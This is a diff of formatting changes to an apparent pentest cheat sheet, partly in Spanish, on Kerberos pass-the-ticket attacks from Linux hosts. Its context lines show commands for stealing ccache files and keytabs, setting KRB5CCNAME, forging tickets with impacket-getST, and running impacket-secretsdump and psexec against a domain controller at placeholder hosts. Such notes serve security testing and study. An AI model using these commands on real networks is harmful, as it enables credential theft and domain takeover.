@@ -17,7 +17,7 @@ linked:
 ---
 # Pass-the-Ticket - Linux Extraction
 
-***
+---
 
 ## ccache Locations
 
@@ -41,7 +41,7 @@ realm list 2>/dev/null
 id $(whoami)  # ¿tiene grupos de AD?
 ```
 
-___
+---
 
 ## Robar ccache desde disco
 
@@ -62,7 +62,7 @@ klist
 impacket-secretsdump -k -no-pass corp.local/admin@dc01.corp.local
 ```
 
-___
+---
 
 ## KRB5CCNAME — activar ccache
 
@@ -84,7 +84,7 @@ klist
 impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
 ```
 
-___
+---
 
 ## impacket-getST (generar ticket remotamente)
 
@@ -107,7 +107,7 @@ export KRB5CCNAME=administrator@cifs_dc01.corp.local.ccache
 impacket-secretsdump -k -no-pass -just-dc corp.local/administrator@dc01.corp.local
 ```
 
-___
+---
 
 ## kinit (generar TGT desde password)
 
@@ -134,7 +134,7 @@ klist
 impacket-smbclient -k -no-pass corp.local/administrator@dc01.corp.local
 ```
 
-___
+---
 
 ## SSSD / realmd — hosts AD-joined
 
@@ -156,4 +156,4 @@ kinit -kt stolen.keytab host/hostname@CORP.LOCAL
 klist
 ```
 
-***
+---
